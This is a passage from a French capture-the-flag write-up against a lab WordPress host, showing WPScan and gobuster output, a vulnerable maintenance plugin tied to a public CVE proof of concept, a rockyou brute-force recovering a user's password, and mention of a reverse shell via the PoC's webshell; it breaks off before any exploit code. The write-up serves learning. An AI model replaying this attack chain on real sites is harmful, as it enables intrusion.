<a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a>
<a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a><span class="s1">[+] Headers</span>
<a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a><span class="s1"> | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)</span>
<a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a><span class="s1"> | Found By: Headers (Passive Detection)</span>
<a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a><span class="s1"> | Confidence: 100%</span>
<a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a>
<a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a><span class="s1">[+] robots.txt found: http://pantheon.god/robots.txt</span>
<a id="__codelineno-2-27" name="__codelineno-2-27" href="#__codelineno-2-27"></a><span class="s1"> | Interesting Entries:</span>
<a id="__codelineno-2-28" name="__codelineno-2-28" href="#__codelineno-2-28"></a><span class="s1"> |  - /wp-admin/</span>
<a id="__codelineno-2-29" name="__codelineno-2-29" href="#__codelineno-2-29"></a><span class="s1"> |  - /wp-admin/admin-ajax.php</span>
<a id="__codelineno-2-30" name="__codelineno-2-30" href="#__codelineno-2-30"></a><span class="s1"> | Found By: Robots Txt (Aggressive Detection)</span>
<a id="__codelineno-2-31" name="__codelineno-2-31" href="#__codelineno-2-31"></a><span class="s1"> | Confidence: 100%</span>
<a id="__codelineno-2-32" name="__codelineno-2-32" href="#__codelineno-2-32"></a>
<a id="__codelineno-2-33" name="__codelineno-2-33" href="#__codelineno-2-33"></a><span class="s1">[+] XML-RPC seems to be enabled: http://pantheon.god/xmlrpc.php</span>
<a id="__codelineno-2-34" name="__codelineno-2-34" href="#__codelineno-2-34"></a><span class="s1"> | Found By: Direct Access (Aggressive Detection)</span>
<a id="__codelineno-2-35" name="__codelineno-2-35" href="#__codelineno-2-35"></a><span class="s1"> | Confidence: 100%</span>
<a id="__codelineno-2-36" name="__codelineno-2-36" href="#__codelineno-2-36"></a><span class="s1"> | References:</span>
<a id="__codelineno-2-37" name="__codelineno-2-37" href="#__codelineno-2-37"></a><span class="s1"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span>
<a id="__codelineno-2-38" name="__codelineno-2-38" href="#__codelineno-2-38"></a><span class="s1"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span>
<a id="__codelineno-2-39" name="__codelineno-2-39" href="#__codelineno-2-39"></a><span class="s1"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span>
<a id="__codelineno-2-40" name="__codelineno-2-40" href="#__codelineno-2-40"></a><span class="s1"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span>
<a id="__codelineno-2-41" name="__codelineno-2-41" href="#__codelineno-2-41"></a><span class="s1"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span>
<a id="__codelineno-2-42" name="__codelineno-2-42" href="#__codelineno-2-42"></a>
<a id="__codelineno-2-43" name="__codelineno-2-43" href="#__codelineno-2-43"></a><span class="s1">[+] WordPress readme found: http://pantheon.god/readme.html</span>
<a id="__codelineno-2-44" name="__codelineno-2-44" href="#__codelineno-2-44"></a><span class="s1"> | Found By: Direct Access (Aggressive Detection)</span>
<a id="__codelineno-2-45" name="__codelineno-2-45" href="#__codelineno-2-45"></a><span class="s1"> | Confidence: 100%</span>
<a id="__codelineno-2-46" name="__codelineno-2-46" href="#__codelineno-2-46"></a>
<a id="__codelineno-2-47" name="__codelineno-2-47" href="#__codelineno-2-47"></a><span class="s1">[+] Upload directory has listing enabled: http://pantheon.god/wp-content/uploads/</span>
<a id="__codelineno-2-48" name="__codelineno-2-48" href="#__codelineno-2-48"></a><span class="s1"> | Found By: Direct Access (Aggressive Detection)</span>
<a id="__codelineno-2-49" name="__codelineno-2-49" href="#__codelineno-2-49"></a><span class="s1"> | Confidence: 100%</span>
<a id="__codelineno-2-50" name="__codelineno-2-50" href="#__codelineno-2-50"></a>
<a id="__codelineno-2-51" name="__codelineno-2-51" href="#__codelineno-2-51"></a><span class="s1">[+] The external WP-Cron seems to be enabled: http://pantheon.god/wp-cron.php</span>
<a id="__codelineno-2-52" name="__codelineno-2-52" href="#__codelineno-2-52"></a><span class="s1"> | Found By: Direct Access (Aggressive Detection)</span>
<a id="__codelineno-2-53" name="__codelineno-2-53" href="#__codelineno-2-53"></a><span class="s1"> | Confidence: 60%</span>
<a id="__codelineno-2-54" name="__codelineno-2-54" href="#__codelineno-2-54"></a><span class="s1"> | References:</span>
<a id="__codelineno-2-55" name="__codelineno-2-55" href="#__codelineno-2-55"></a><span class="s1"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span>
<a id="__codelineno-2-56" name="__codelineno-2-56" href="#__codelineno-2-56"></a><span class="s1"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span>
<a id="__codelineno-2-57" name="__codelineno-2-57" href="#__codelineno-2-57"></a>
<a id="__codelineno-2-58" name="__codelineno-2-58" href="#__codelineno-2-58"></a><span class="s1">[+] WordPress version 6.8.1 identified (Latest, released on 2025-04-30).</span>
<a id="__codelineno-2-59" name="__codelineno-2-59" href="#__codelineno-2-59"></a><span class="s1"> | Found By: Rss Generator (Passive Detection)</span>
<a id="__codelineno-2-60" name="__codelineno-2-60" href="#__codelineno-2-60"></a><span class="s1"> |  - http://pantheon.god/feed/, &lt;generator&gt;https://wordpress.org/?v=6.8.1&lt;/generator&gt;</span>
<a id="__codelineno-2-61" name="__codelineno-2-61" href="#__codelineno-2-61"></a><span class="s1"> |  - http://pantheon.god/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.8.1&lt;/generator&gt;</span>
<a id="__codelineno-2-62" name="__codelineno-2-62" href="#__codelineno-2-62"></a>
<a id="__codelineno-2-63" name="__codelineno-2-63" href="#__codelineno-2-63"></a><span class="s1">[+] WordPress theme in use: twentytwentyfive</span>
<a id="__codelineno-2-64" name="__codelineno-2-64" href="#__codelineno-2-64"></a><span class="s1"> | Location: http://pantheon.god/wp-content/themes/twentytwentyfive/</span>
<a id="__codelineno-2-65" name="__codelineno-2-65" href="#__codelineno-2-65"></a><span class="s1"> | Latest Version: 1.2 (up to date)</span>
<a id="__codelineno-2-66" name="__codelineno-2-66" href="#__codelineno-2-66"></a><span class="s1"> | Last Updated: 2025-04-15T00:00:00.000Z</span>
<a id="__codelineno-2-67" name="__codelineno-2-67" href="#__codelineno-2-67"></a><span class="s1"> | Readme: http://pantheon.god/wp-content/themes/twentytwentyfive/readme.txt</span>
<a id="__codelineno-2-68" name="__codelineno-2-68" href="#__codelineno-2-68"></a><span class="s1"> | [!] Directory listing is enabled</span>
<a id="__codelineno-2-69" name="__codelineno-2-69" href="#__codelineno-2-69"></a><span class="s1"> | Style URL: http://pantheon.god/wp-content/themes/twentytwentyfive/style.css?ver=1.2</span>
<a id="__codelineno-2-70" name="__codelineno-2-70" href="#__codelineno-2-70"></a><span class="s1"> | Style Name: Twenty Twenty-Five</span>
<a id="__codelineno-2-71" name="__codelineno-2-71" href="#__codelineno-2-71"></a><span class="s1"> | Style URI: https://wordpress.org/themes/twentytwentyfive/</span>
<a id="__codelineno-2-72" name="__codelineno-2-72" href="#__codelineno-2-72"></a><span class="s1"> | Description: Twenty Twenty-Five emphasizes simplicity and adaptability. It offers flexible design options, suppor...</span>
<a id="__codelineno-2-73" name="__codelineno-2-73" href="#__codelineno-2-73"></a><span class="s1"> | Author: the WordPress team</span>
<a id="__codelineno-2-74" name="__codelineno-2-74" href="#__codelineno-2-74"></a><span class="s1"> | Author URI: https://wordpress.org</span>
<a id="__codelineno-2-75" name="__codelineno-2-75" href="#__codelineno-2-75"></a><span class="s1"> |</span>
<a id="__codelineno-2-76" name="__codelineno-2-76" href="#__codelineno-2-76"></a><span class="s1"> | Found By: Css Style In Homepage (Passive Detection)</span>
<a id="__codelineno-2-77" name="__codelineno-2-77" href="#__codelineno-2-77"></a><span class="s1"> | Confirmed By: Css Style In 404 Page (Passive Detection)</span>
<a id="__codelineno-2-78" name="__codelineno-2-78" href="#__codelineno-2-78"></a><span class="s1"> |</span>
<a id="__codelineno-2-79" name="__codelineno-2-79" href="#__codelineno-2-79"></a><span class="s1"> | Version: 1.2 (80% confidence)</span>
<a id="__codelineno-2-80" name="__codelineno-2-80" href="#__codelineno-2-80"></a><span class="s1"> | Found By: Style (Passive Detection)</span>
<a id="__codelineno-2-81" name="__codelineno-2-81" href="#__codelineno-2-81"></a><span class="s1"> |  - http://pantheon.god/wp-content/themes/twentytwentyfive/style.css?ver=1.2, Match: &#39;</span>Version:<span class="w"> </span><span class="m">1</span>.2<span class="err">&#39;</span>
<a id="__codelineno-2-82" name="__codelineno-2-82" href="#__codelineno-2-82"></a>
<a id="__codelineno-2-83" name="__codelineno-2-83" href="#__codelineno-2-83"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Enumerating<span class="w"> </span>All<span class="w"> </span>Plugins<span class="w"> </span><span class="o">(</span>via<span class="w"> </span>Aggressive<span class="w"> </span>Methods<span class="o">)</span>
<a id="__codelineno-2-84" name="__codelineno-2-84" href="#__codelineno-2-84"></a><span class="w"> </span>Checking<span class="w"> </span>Known<span class="w"> </span>Locations<span class="w"> </span>-<span class="w"> </span>Time:<span class="w"> </span><span class="m">00</span>:04:30<span class="w"> </span>&lt;<span class="o">=======================================</span><span class="w">                                                                                                                                          </span>Checking<span class="w"> </span>Known<span class="w"> </span>Locations<span class="w"> </span>-<span class="w"> </span>Time:<span class="w"> </span><span class="m">00</span>:22:44<span class="w"> </span>&lt;<span class="o">========================</span>&gt;<span class="w"> </span><span class="o">(</span><span class="m">110793</span><span class="w"> </span>/<span class="w"> </span><span class="m">110793</span><span class="o">)</span><span class="w"> </span><span class="m">100</span>.00%<span class="w"> </span>Time:<span class="w"> </span><span class="m">00</span>:22:44<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span>Plugin<span class="w"> </span>Versions<span class="w"> </span><span class="o">(</span>via<span class="w"> </span>Passive<span class="w"> </span>and<span class="w"> </span>Aggressive<span class="w"> </span>Methods<span class="o">)</span><span class="w">     </span>&gt;<span class="w"> </span><span class="o">(</span><span class="m">75092</span><span class="w"> </span>/<span class="w"> </span><span class="m">110793</span><span class="o">)</span><span class="w"> </span><span class="m">67</span>.77%<span class="w">  </span>ETA:<span class="w"> </span><span class="m">00</span>:06:54
<a id="__codelineno-2-85" name="__codelineno-2-85" href="#__codelineno-2-85"></a>
<a id="__codelineno-2-86" name="__codelineno-2-86" href="#__codelineno-2-86"></a><span class="o">[</span>i<span class="o">]</span><span class="w"> </span>Plugin<span class="o">(</span>s<span class="o">)</span><span class="w"> </span>Identified:
<a id="__codelineno-2-87" name="__codelineno-2-87" href="#__codelineno-2-87"></a>
<a id="__codelineno-2-88" name="__codelineno-2-88" href="#__codelineno-2-88"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>akismet
<a id="__codelineno-2-89" name="__codelineno-2-89" href="#__codelineno-2-89"></a><span class="w"> </span><span class="p">|</span><span class="w"> </span>Location:<span class="w"> </span>http://pantheon.god/wp-content/plugins/akismet/
<a id="__codelineno-2-90" name="__codelineno-2-90" href="#__codelineno-2-90"></a><span class="w"> </span><span class="p">|</span><span class="w"> </span>Latest<span class="w"> </span>Version:<span class="w"> </span><span class="m">5</span>.4
<a id="__codelineno-2-91" name="__codelineno-2-91" href="#__codelineno-2-91"></a><span class="w"> </span><span class="p">|</span><span class="w"> </span>Last<span class="w"> </span>Updated:<span class="w"> </span><span class="m">2025</span>-05-07T16:30:00.000Z
<a id="__codelineno-2-92" name="__codelineno-2-92" href="#__codelineno-2-92"></a><span class="w"> </span><span class="p">|</span>
<a id="__codelineno-2-93" name="__codelineno-2-93" href="#__codelineno-2-93"></a><span class="w"> </span><span class="p">|</span><span class="w"> </span>Found<span class="w"> </span>By:<span class="w"> </span>Known<span class="w"> </span>Locations<span class="w"> </span><span class="o">(</span>Aggressive<span class="w"> </span>Detection<span class="o">)</span>
<a id="__codelineno-2-94" name="__codelineno-2-94" href="#__codelineno-2-94"></a><span class="w"> </span><span class="p">|</span><span class="w">  </span>-<span class="w"> </span>http://pantheon.god/wp-content/plugins/akismet/,<span class="w"> </span>status:<span class="w"> </span><span class="m">403</span>
<a id="__codelineno-2-95" name="__codelineno-2-95" href="#__codelineno-2-95"></a><span class="w"> </span><span class="p">|</span>
<a id="__codelineno-2-96" name="__codelineno-2-96" href="#__codelineno-2-96"></a><span class="w"> </span><span class="p">|</span><span class="w"> </span>The<span class="w"> </span>version<span class="w"> </span>could<span class="w"> </span>not<span class="w"> </span>be<span class="w"> </span>determined.
<a id="__codelineno-2-97" name="__codelineno-2-97" href="#__codelineno-2-97"></a>
<a id="__codelineno-2-98" name="__codelineno-2-98" href="#__codelineno-2-98"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>cmp-coming-soon-maintenance
<a id="__codelineno-2-99" name="__codelineno-2-99" href="#__codelineno-2-99"></a><span class="w"> </span><span class="p">|</span><span class="w"> </span>Location:<span class="w"> </span>http://pantheon.god/wp-content/plugins/cmp-coming-soon-maintenance/
<a id="__codelineno-2-100" name="__codelineno-2-100" href="#__codelineno-2-100"></a><span class="w"> </span><span class="p">|</span><span class="w"> </span>Last<span class="w"> </span>Updated:<span class="w"> </span><span class="m">2025</span>-04-30T08:07:00.000Z
<a id="__codelineno-2-101" name="__codelineno-2-101" href="#__codelineno-2-101"></a><span class="w"> </span><span class="p">|</span><span class="w"> </span>Readme:<span class="w"> </span>http://pantheon.god/wp-content/plugins/cmp-coming-soon-maintenance/readme.txt
<a id="__codelineno-2-102" name="__codelineno-2-102" href="#__codelineno-2-102"></a><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="o">[</span>!<span class="o">]</span><span class="w"> </span>The<span class="w"> </span>version<span class="w"> </span>is<span class="w"> </span>out<span class="w"> </span>of<span class="w"> </span>date,<span class="w"> </span>the<span class="w"> </span>latest<span class="w"> </span>version<span class="w"> </span>is<span class="w"> </span><span class="m">4</span>.1.15
<a id="__codelineno-2-103" name="__codelineno-2-103" href="#__codelineno-2-103"></a><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Directory<span class="w"> </span>listing<span class="w"> </span>is<span class="w"> </span>enabled
<a id="__codelineno-2-104" name="__codelineno-2-104" href="#__codelineno-2-104"></a><span class="w"> </span><span class="p">|</span>
<a id="__codelineno-2-105" name="__codelineno-2-105" href="#__codelineno-2-105"></a><span class="w"> </span><span class="p">|</span><span class="w"> </span>Found<span class="w"> </span>By:<span class="w"> </span>Known<span class="w"> </span>Locations<span class="w"> </span><span class="o">(</span>Aggressive<span class="w"> </span>Detection<span class="o">)</span>
<a id="__codelineno-2-106" name="__codelineno-2-106" href="#__codelineno-2-106"></a><span class="w"> </span><span class="p">|</span><span class="w">  </span>-<span class="w"> </span>http://pantheon.god/wp-content/plugins/cmp-coming-soon-maintenance/,<span class="w"> </span>status:<span class="w"> </span><span class="m">200</span>
<a id="__codelineno-2-107" name="__codelineno-2-107" href="#__codelineno-2-107"></a><span class="w"> </span><span class="p">|</span>
<a id="__codelineno-2-108" name="__codelineno-2-108" href="#__codelineno-2-108"></a><span class="w"> </span><span class="p">|</span><span class="w"> </span>Version:<span class="w"> </span><span class="m">4</span>.1.13<span class="w"> </span><span class="o">(</span><span class="m">80</span>%<span class="w"> </span>confidence<span class="o">)</span>
<a id="__codelineno-2-109" name="__codelineno-2-109" href="#__codelineno-2-109"></a><span class="w"> </span><span class="p">|</span><span class="w"> </span>Found<span class="w"> </span>By:<span class="w"> </span>Readme<span class="w"> </span>-<span class="w"> </span>Stable<span class="w"> </span>Tag<span class="w"> </span><span class="o">(</span>Aggressive<span class="w"> </span>Detection<span class="o">)</span>
<a id="__codelineno-2-110" name="__codelineno-2-110" href="#__codelineno-2-110"></a><span class="w"> </span><span class="p">|</span><span class="w">  </span>-<span class="w"> </span>http://pantheon.god/wp-content/plugins/cmp-coming-soon-maintenance/readme.txt
<a id="__codelineno-2-111" name="__codelineno-2-111" href="#__codelineno-2-111"></a>
<a id="__codelineno-2-112" name="__codelineno-2-112" href="#__codelineno-2-112"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>feed
<a id="__codelineno-2-113" name="__codelineno-2-113" href="#__codelineno-2-113"></a><span class="w"> </span><span class="p">|</span><span class="w"> </span>Location:<span class="w"> </span>http://pantheon.god/wp-content/plugins/feed/
<a id="__codelineno-2-114" name="__codelineno-2-114" href="#__codelineno-2-114"></a><span class="w"> </span><span class="p">|</span>
<a id="__codelineno-2-115" name="__codelineno-2-115" href="#__codelineno-2-115"></a><span class="w"> </span><span class="p">|</span><span class="w"> </span>Found<span class="w"> </span>By:<span class="w"> </span>Known<span class="w"> </span>Locations<span class="w"> </span><span class="o">(</span>Aggressive<span class="w"> </span>Detection<span class="o">)</span>
<a id="__codelineno-2-116" name="__codelineno-2-116" href="#__codelineno-2-116"></a><span class="w"> </span><span class="p">|</span><span class="w">  </span>-<span class="w"> </span>http://pantheon.god/wp-content/plugins/feed/,<span class="w"> </span>status:<span class="w"> </span><span class="m">200</span>
<a id="__codelineno-2-117" name="__codelineno-2-117" href="#__codelineno-2-117"></a><span class="w"> </span><span class="p">|</span>
<a id="__codelineno-2-118" name="__codelineno-2-118" href="#__codelineno-2-118"></a><span class="w"> </span><span class="p">|</span><span class="w"> </span>The<span class="w"> </span>version<span class="w"> </span>could<span class="w"> </span>not<span class="w"> </span>be<span class="w"> </span>determined.
<a id="__codelineno-2-119" name="__codelineno-2-119" href="#__codelineno-2-119"></a>
<a id="__codelineno-2-120" name="__codelineno-2-120" href="#__codelineno-2-120"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Enumerating<span class="w"> </span>Config<span class="w"> </span>Backups<span class="w"> </span><span class="o">(</span>via<span class="w"> </span>Passive<span class="w"> </span>and<span class="w"> </span>Aggressive<span class="w"> </span>Methods<span class="o">)</span>
<a id="__codelineno-2-121" name="__codelineno-2-121" href="#__codelineno-2-121"></a><span class="w"> </span>Checking<span class="w"> </span>Config<span class="w"> </span>Backups<span class="w"> </span>-<span class="w"> </span>Time:<span class="w"> </span><span class="m">00</span>:00:01<span class="w"> </span>&lt;<span class="o">===============================</span>&gt;<span class="w"> </span><span class="o">(</span><span class="m">137</span><span class="w"> </span>/<span class="w"> </span><span class="m">137</span><span class="o">)</span><span class="w"> </span><span class="m">100</span>.00%<span class="w"> </span>Time:<span class="w"> </span><span class="m">00</span>:00:01
<a id="__codelineno-2-122" name="__codelineno-2-122" href="#__codelineno-2-122"></a>
<a id="__codelineno-2-123" name="__codelineno-2-123" href="#__codelineno-2-123"></a><span class="o">[</span>i<span class="o">]</span><span class="w"> </span>No<span class="w"> </span>Config<span class="w"> </span>Backups<span class="w"> </span>Found.
<a id="__codelineno-2-124" name="__codelineno-2-124" href="#__codelineno-2-124"></a>
<a id="__codelineno-2-125" name="__codelineno-2-125" href="#__codelineno-2-125"></a><span class="o">[</span>!<span class="o">]</span><span class="w"> </span>No<span class="w"> </span>WPScan<span class="w"> </span>API<span class="w"> </span>Token<span class="w"> </span>given,<span class="w"> </span>as<span class="w"> </span>a<span class="w"> </span>result<span class="w"> </span>vulnerability<span class="w"> </span>data<span class="w"> </span>has<span class="w"> </span>not<span class="w"> </span>been<span class="w"> </span>output.
<a id="__codelineno-2-126" name="__codelineno-2-126" href="#__codelineno-2-126"></a><span class="o">[</span>!<span class="o">]</span><span class="w"> </span>You<span class="w"> </span>can<span class="w"> </span>get<span class="w"> </span>a<span class="w"> </span>free<span class="w"> </span>API<span class="w"> </span>token<span class="w"> </span>with<span class="w"> </span><span class="m">25</span><span class="w"> </span>daily<span class="w"> </span>requests<span class="w"> </span>by<span class="w"> </span>registering<span class="w"> </span>at<span class="w"> </span>https://wpscan.com/register
<a id="__codelineno-2-127" name="__codelineno-2-127" href="#__codelineno-2-127"></a>
<a id="__codelineno-2-128" name="__codelineno-2-128" href="#__codelineno-2-128"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Finished:<span class="w"> </span>Tue<span class="w"> </span>May<span class="w"> </span><span class="m">27</span><span class="w"> </span><span class="m">02</span>:24:34<span class="w"> </span><span class="m">2025</span>
<a id="__codelineno-2-129" name="__codelineno-2-129" href="#__codelineno-2-129"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Requests<span class="w"> </span>Done:<span class="w"> </span><span class="m">110950</span>
<a id="__codelineno-2-130" name="__codelineno-2-130" href="#__codelineno-2-130"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Cached<span class="w"> </span>Requests:<span class="w"> </span><span class="m">44</span>
<a id="__codelineno-2-131" name="__codelineno-2-131" href="#__codelineno-2-131"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Data<span class="w"> </span>Sent:<span class="w"> </span><span class="m">29</span>.306<span class="w"> </span>MB
<a id="__codelineno-2-132" name="__codelineno-2-132" href="#__codelineno-2-132"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Data<span class="w"> </span>Received:<span class="w"> </span><span class="m">33</span>.036<span class="w"> </span>MB
<a id="__codelineno-2-133" name="__codelineno-2-133" href="#__codelineno-2-133"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Memory<span class="w"> </span>used:<span class="w"> </span><span class="m">594</span>.039<span class="w"> </span>MB
<a id="__codelineno-2-134" name="__codelineno-2-134" href="#__codelineno-2-134"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Elapsed<span class="w"> </span>time:<span class="w"> </span><span class="m">00</span>:22:56
<a id="__codelineno-2-135" name="__codelineno-2-135" href="#__codelineno-2-135"></a><span class="o">[</span>May<span class="w"> </span><span class="m">27</span>,<span class="w"> </span><span class="m">2025</span><span class="w"> </span>-<span class="w"> </span><span class="m">02</span>:29:55<span class="w"> </span><span class="o">(</span>CE
</code></pre></div>
</li>
</ul>
<p>Ainsi on trouve le plugin <code>cmp-coming-soon-maintenance</code> qui est sous ça version 4.1.13. On voit rapidement  des <code>POC</code>  sur internet pour cette vulnérabilité comme celui de <code>Nxploited</code>  https://github.com/Nxploited/CVE-2025-32118. </p>
<p>Cependant on fais face à un problème, il faut des credentials pour lancer cette exploit, hors nous n’en avons pas.</p>
<ul>
<li>
<p>Mais après énumération avec <code>gobuster</code>, on trouve une note au chemins <code>/wp-content/notes.txt</code> indiquant que tout les dieux devais changer leurs mots de passe et mettre un <code>y</code> mais seul hermes ne l’avais pas fais.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>[Jun 22, 2025 - 21:22:15 (CEST)] exegol-pantheon_wu gobuster # gobuster dir -w `fzf-wordlists` -u http://olympe.god/wp-content -x txt,html,php
<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>===============================================================
<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>Gobuster v3.6
<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>===============================================================
<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>[+] Url:                     http://olympe.god/wp-content
<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>[+] Method:                  GET
<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>[+] Threads:                 10
<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>[+] Wordlist:                /opt/lists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>[+] Negative Status codes:   404
<a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>[+] User Agent:              gobuster/3.6
<a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>[+] Extensions:              txt,html,php
<a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>[+] Timeout:                 10s
<a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>===============================================================
<a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>Starting gobuster in directory enumeration mode
<a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a>===============================================================
<a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a>/.php                 (Status: 403) [Size: 275]
<a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a>/index.php            (Status: 200) [Size: 0]
<a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a>/.html                (Status: 403) [Size: 275]
<a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a>/rss                  (Status: 301) [Size: 0] [--&gt; http://olympe.god/wp-content/feed/]
<a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a>/feed                 (Status: 301) [Size: 0] [--&gt; http://olympe.god/wp-content/feed/]
<a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a>/themes               (Status: 301) [Size: 320] [--&gt; http://olympe.god/wp-content/themes/]
<a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a>/uploads              (Status: 301) [Size: 321] [--&gt; http://olympe.god/wp-content/uploads/]
<a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a>/atom                 (Status: 301) [Size: 0] [--&gt; http://olympe.god/wp-content/feed/atom/]
<a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a>/b                    (Status: 301) [Size: 0] [--&gt; http://olympe.god/]
<a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a>/a                    (Status: 301) [Size: 0] [--&gt; http://olympe.god/athena-2/]
<a id="__codelineno-3-27" name="__codelineno-3-27" href="#__codelineno-3-27"></a>/de                   (Status: 301) [Size: 0] [--&gt; http://olympe.god/demeter-2/]
<a id="__codelineno-3-28" name="__codelineno-3-28" href="#__codelineno-3-28"></a>/p                    (Status: 301) [Size: 0] [--&gt; http://olympe.god/poseidon-2/]
<a id="__codelineno-3-29" name="__codelineno-3-29" href="#__codelineno-3-29"></a>/d                    (Status: 301) [Size: 0] [--&gt; http://olympe.god/demeter-2/]
<a id="__codelineno-3-30" name="__codelineno-3-30" href="#__codelineno-3-30"></a>/art                  (Status: 301) [Size: 0] [--&gt; http://olympe.god/artemis-2/]
<a id="__codelineno-3-31" name="__codelineno-3-31" href="#__codelineno-3-31"></a>/h                    (Status: 301) [Size: 0] [--&gt; http://olympe.god/hello-world/]
<a id="__codelineno-3-32" name="__codelineno-3-32" href="#__codelineno-3-32"></a>/l                    (Status: 301) [Size: 0] [--&gt; http://olympe.god/les-12-dieux/]
<a id="__codelineno-3-33" name="__codelineno-3-33" href="#__codelineno-3-33"></a>/plugins              (Status: 301) [Size: 321] [--&gt; http://olympe.god/wp-content/plugins/]
<a id="__codelineno-3-34" name="__codelineno-3-34" href="#__codelineno-3-34"></a>/rss2                 (Status: 301) [Size: 0] [--&gt; http://olympe.god/wp-content/feed/]
<a id="__codelineno-3-35" name="__codelineno-3-35" href="#__codelineno-3-35"></a>/z                    (Status: 301) [Size: 0] [--&gt; http://olympe.god/zeus-2/]
<a id="__codelineno-3-36" name="__codelineno-3-36" href="#__codelineno-3-36"></a>/A                    (Status: 301) [Size: 0] [--&gt; http://olympe.god/athena-2/]
<a id="__codelineno-3-37" name="__codelineno-3-37" href="#__codelineno-3-37"></a>/ap                   (Status: 301) [Size: 0] [--&gt; http://olympe.god/aphrodite-2/]
<a id="__codelineno-3-38" name="__codelineno-3-38" href="#__codelineno-3-38"></a>/P                    (Status: 301) [Size: 0] [--&gt; http://olympe.god/poseidon-2/]
<a id="__codelineno-3-39" name="__codelineno-3-39" href="#__codelineno-3-39"></a>/wp-register.php      (Status: 301) [Size: 0] [--&gt; http://olympe.god/wp-login.php?action=register]
<a id="__codelineno-3-40" name="__codelineno-3-40" href="#__codelineno-3-40"></a>/upgrade              (Status: 301) [Size: 321] [--&gt; http://olympe.god/wp-content/upgrade/]
<a id="__codelineno-3-41" name="__codelineno-3-41" href="#__codelineno-3-41"></a>/notes.txt            (Status: 200) [Size: 391]
<a id="__codelineno-3-42" name="__codelineno-3-42" href="#__codelineno-3-42"></a>/B                    (Status: 301) [Size: 0] [--&gt; http://olympe.god/]
<a id="__codelineno-3-43" name="__codelineno-3-43" href="#__codelineno-3-43"></a>/ar                   (Status: 301) [Size: 0] [--&gt; http://olympe.god/ares-2/]
<a id="__codelineno-3-44" name="__codelineno-3-44" href="#__codelineno-3-44"></a>Progress: 4569 / 882240 (0.52%)
</code></pre></div>
</li>
</ul>
<p>On lance alors un bruteforce sur la page de login en tant que hermes et avec la wordlist rockyou.txt et on trouve le mots de passe <code>mondieu</code> </p>
<p>A partir de là, on peut utiliser la CVE pour obtenir un accès <code>www-data</code> sur la machine via un revershell obtenue à travers le webshell offert par le POC de la CVE.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1">#POC CVE wordpress</span>
